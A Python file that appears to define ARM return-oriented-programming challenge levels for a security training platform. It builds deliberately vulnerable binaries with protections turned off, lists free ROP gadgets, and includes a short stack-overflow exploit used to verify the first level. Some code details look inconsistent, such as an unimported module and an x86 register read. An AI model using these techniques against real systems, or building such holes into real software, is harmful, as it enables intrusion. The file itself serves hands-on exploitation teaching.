
import pwn
import pwnshop

PWNSHOP_AUTOREGISTER = False

from pwnshop import Challenge, retry

class ArmRopBase(Challenge):
    COMPILER = "clang"
    LINK_LIBRARIES = ["capstone", "dl"]
    PIE = False
    CANARY = False
    RELRO = "partial"
    MASM_FLAG = None

    TEMPLATE_PATH = "armrop/armrop.c"

    read_size = 0x1000
    free_gadgets = []
    free_gadgets_asm = []

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

        self.input_size = self.random.randrange(16, 128)
        self.bin_padding = self.random.randrange(0x10, 0x1000)
        if self.free_gadgets:
            self.free_gadgets = self.free_gadgets.copy()
            self.random.shuffle(self.free_gadgets)

    def get_retaddr_offset(self, **kwargs):
        with self.run_challenge(**kwargs) as process:
            process.send(pwn.cyclic(self.read_size))
            process.readall()
            assert process.poll(True) == -signal.SIGSEGV

        core = pwn.Coredump("core")
        return pwn.cyclic_find(pwn.u32(core.stack[core.rsp : core.rsp + 4]))

class ArmRopLevel1(ArmRopBase):
    ""
    win_function = True
    description = "The goal of this level is quite simple: redirect control flow to the win function."

    def verify(self, **kwargs):
        """
        TBD
        """
        retaddr_offset = self.get_retaddr_offset(**kwargs)

        with self.run_challenge(**kwargs) as process:
            payload = b"A" * retaddr_offset
            payload += pwn.p64(process.elf.symbols["win"])
            process.send(payload)

            assert self.flag in process.readall()

class ArmRopLevel2(ArmRopBase):
    ""
    multi_staged_win_function = [1, 2]
    description = "Now let's see about redirect control flow to multiple functions."

class ArmRopLevel3(ArmRopBase):
    ""
    multi_staged_win_function_authed = True
    description = "What about passing arguments to multiple functions?"
    free_gadgets_asm = [
        "ldp x0, x1, [sp]; br x1",
    ]
    

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.multi_staged_win_function = list(range(1, 5 + 1))
        self.random.shuffle(self.multi_staged_win_function)

class ArmRopLevel3RealTest(ArmRopBase):
    ""
    multi_staged_win_function_authed = True
    description = "If you did the last one correctly this should be easy."
    free_gadgets_asm = [
        "ldp x0, x1, [sp]; br x1",
    ]

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.multi_staged_win_function_real = list(range(1, 5 + 1))
        self.random.shuffle(self.multi_staged_win_function_real)


class ArmRopLevel4(ArmRopBase):
    ""
    free_gadgets_asm = [
        "ldp x0, x1, [sp], #0x10; br x1",
        "ldp x1, x2, [sp], #0x10; br x2",
        "ldp x2, x3, [sp], #0x10; br x3",
        "ldp x3, x4, [sp], #0x10; br x4",
        "ldp x4, x5, [sp], #0x10; br x5",
        "ldp x5, x6, [sp], #0x10; br x6",
        "ldp x6, x7, [sp], #0x10; br x7",
        "ldp x7, x8, [sp], #0x10; br x8",
        "ldp x8, x9, [sp], #0x10; br x9",
        "ldp x29, x30, [sp], #0x10; br x30",
        "ldp x30, x29, [sp], #0x10; br x29",
        "svc #0; ret",
    ]
    description = "Now, let's just pop stuff"
    leak_stack = True

class ArmRopStaticBinary(ArmRopBase):
    ""
    description = "Pop statically compiled binary"
    STATIC = True
    leak_stack = True

class ArmRopLevel3RealTestGcc(ArmRopBase):
    ""
    COMPILER = "gcc"
    multi_staged_win_function_authed = True
    description = "Same level, but with gcc."

    free_gadgets_asm = [
        "ldp x0, x1, [sp]; br x1",
    ]

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.multi_staged_win_function_real = list(range(1, 5 + 1))
        self.random.shuffle(self.multi_staged_win_function_real)

class ArmRopLevel4Gcc(ArmRopBase):
    ""
    COMPILER = "clang"
    free_gadgets_asm = [
        "ldp x0, x1, [sp], #0x10; br x1",
        "ldp x1, x2, [sp], #0x10; br x2",
        "ldp x2, x3, [sp], #0x10; br x3",
        "ldp x3, x4, [sp], #0x10; br x4",
        "ldp x4, x5, [sp], #0x10; br x5",
        "ldp x5, x6, [sp], #0x10; br x6",
        "ldp x6, x7, [sp], #0x10; br x7",
        "ldp x7, x8, [sp], #0x10; br x8",
        "ldp x8, x9, [sp], #0x10; br x9",
        "ldp x29, x30, [sp], #0x10; br x30",
        "ldp x30, x29, [sp], #0x10; br x29",
        "svc #0; ret",
    ]
    description = "Now, let's just pop stuff"
    leak_stack = True



LEVELS = [
    ArmRopLevel1,
    ArmRopLevel2,
    ArmRopLevel3,
    ArmRopLevel3RealTest,
    ArmRopLevel4,
    ArmRopStaticBinary,
    ArmRopLevel3RealTestGcc,
    ArmRopLevel4Gcc
]
NUM_TESTING=1
DOJO_MODULE="armrop"
pwnshop.register_challenges(LEVELS)
